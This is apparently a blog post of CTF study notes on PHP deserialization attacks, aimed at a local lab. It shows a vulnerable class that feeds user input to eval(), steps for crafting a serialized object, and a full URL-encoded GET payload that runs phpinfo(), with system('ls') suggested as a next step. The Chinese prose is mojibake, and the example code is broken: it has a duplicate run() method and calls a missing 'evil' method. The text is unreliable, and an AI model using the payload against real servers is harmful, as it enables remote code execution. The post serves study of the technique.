---
title: 20241219CTFå­¦ä¹ ç¬”è®°15
date: 2024-12-19
tags:
 - CTF
 - CTFLearn
categories:
   - å‘½ç†å­¦ Numerology
isShowComments: true
publish: true














---

<Boxx/>

ä»0å¼€å§‹å­¦ä¹ CTFï¼Œäº†è§£CTFåŸºæœ¬è§„åˆ™ã€æ–¹æ³•ï¼Œè¿™æ˜¯å¼€å§‹æ‰“å¡å­¦ä¹ çš„ç¬¬32å¤©

[[toc]]

- è§†é¢‘åœ°å€ã€[ğŸ”—ä¼ é€é—¨](https://www.bilibili.com/video/BV1Lh411F7s8/)ã€‘

<!-- more -->

# ç¬¬17ç« ï¼šååºåˆ—åŒ–ä¾‹é¢˜è®²è§£

## ä¾‹é¢˜è®²è§£

```php
<?php
# æ˜¾ç¤ºæ–‡ä»¶å†…å®¹
show_source(__FILE__);
# ä¸æŠ¥é”™
error_reporting(0);
class DEMO{
	public $func;
    public $arg;
    public function safe(){
        echo $this->arg;
    }
    public function run(){
        # æŒ‰phpæ‰§è¡Œargçš„å€¼
        eval($this->arg);
    }
    public function run(){
        # thisè¡¨ç¤ºå¯¹è±¡è‡ªå·±ï¼Œfuncå±æ€§å€¼ç»™thisï¼Œç„¶åæŠŠæ€»ä½“ç»™this
        $this->{$this->func}();
    }
    public function __construct(){
        $this->func = 'evil';
    }   
}
# GETæ–¹å¼ä¼ ä¸€ä¸ªå‚æ•°aï¼Œååºåˆ—åŒ–ä¼ ç»™obj
$obj=unserialize($_GET['a']);
# æ‰§è¡Œobj
$obj->run();
?>
```

ååºåˆ—åŒ–é¢˜ç›®åšé¢˜æ­¥éª¤ï¼š

1. å¤åˆ¶æºä»£ç åˆ°æœ¬åœ°

2. æ³¨é‡Šæ‰å’Œå±æ€§æ— å…³çš„å†…å®¹

   è·Ÿå±æ€§ç›¸å…³çš„åªæœ‰

   ```php
   public $func;
   public $arg;
   ```

3. æ ¹æ®é¢˜ç›®éœ€è¦ï¼Œç»™å±æ€§èµ‹å€¼

   åº”è¯¥ä¼šå…ˆæ‰§è¡Œ`$this->func`ï¼Œæ‰€ä»¥æŠŠfuncèµ‹å€¼æˆevil

   ```php
   public $func="evil";
   public $arg="phpinfo();";
   ```

4. ç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼Œé€šå¸¸è¦urlencode

   ```php
   $d = new DEMO;
   echo urlencode(serialize($d));
   ```

5. ä¼ é€’æ•°æ®åˆ°æœåŠ¡å™¨ï¼ˆæ”»å‡»ç›®æ ‡ï¼‰

   ä½¿ç”¨HackBarä¼ ä¸€ä¸ªGetè¯·æ±‚

   ```
   http://127.0.0.1:8080/unserialize/demo.php?a=O%3A4%3A%22DEMO%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A4%3A%22evil%22%3Bs%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D
   ```

   è¿™ä¸ªè¯·æ±‚ä¸‹åº”è¯¥ä¼šæ‰§è¡Œphpinfo()ï¼Œæ‰€ä»¥ä»–åº”è¯¥ä¹Ÿä¼šæ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼Œæ¯”å¦‚system('ls');''

